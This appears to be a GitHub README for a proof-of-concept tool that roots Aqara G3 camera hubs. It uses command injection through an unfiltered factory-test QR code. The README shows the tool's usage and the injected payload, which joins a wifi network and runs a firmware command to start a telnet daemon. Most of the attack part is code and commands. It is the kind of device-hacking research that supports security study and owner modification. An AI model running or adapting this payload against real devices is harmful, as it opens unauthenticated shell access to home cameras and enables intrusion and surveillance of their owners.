# aQRootG3-DEV #
:warning:  **PoC - DO NOT USE** :warning:

<p align="center" width="100%">
    <img src="https://user-images.githubusercontent.com/1288525/152621650-993c5630-c749-4758-9609-e5421df4d7ff.png"> 
</p>


Info
---------------
So after Aqara went to all the effort of filtering out characters in the commissioning process, they decided to create a new method of factory testing using QRCodes which isn't filtered and is once again exploitable. *slow clap* 👏

This is *not* persistent due to changes in `/etc/S90app`:
```bash
CUSTOM_POST_INIT=/data/scripts/post_init.sh
# if [ -x ${CUSTOM_POST_INIT} ]; then
#     ${CUSTOM_POST_INIT} &
# else
    asetprop sys.camera_ptz_moving true
    fw_manager.sh -r
# fi
```

This is just a PoC, not overly useful in and of itself.

Usage
---------------
```bash
usage: aQRootG3.py [-h] {gwpgl1,gwpagl01} ssid pwd algo [filename]

aQRoot v0.4
Enable telnet via qrcode command injection for Aqara G3 hub

positional arguments:
  {gwpgl1,gwpagl01}  Camera model
  ssid               Wireless SSID
  pwd                Wireless Password
  algo               Wireless Algo (e.g wpa2)
  filename           (Optional) Save QR Code as image

options:
  -h, --help         show this help message and exit
```


Payload Explanation
---------------
```python
payload= [
        f"/usr/factory_test/bin/wifi_test_station.sh '{args.ssid}' '{args.pwd}' {args.algo}",    # Join Wifi
        "echo 1 > /sys/class/gpio/gpio49/value",                                                 # Toggle LED 
        "fw_manager.sh -t -k",                                                                   # Enable tty and start telnetd
]
```




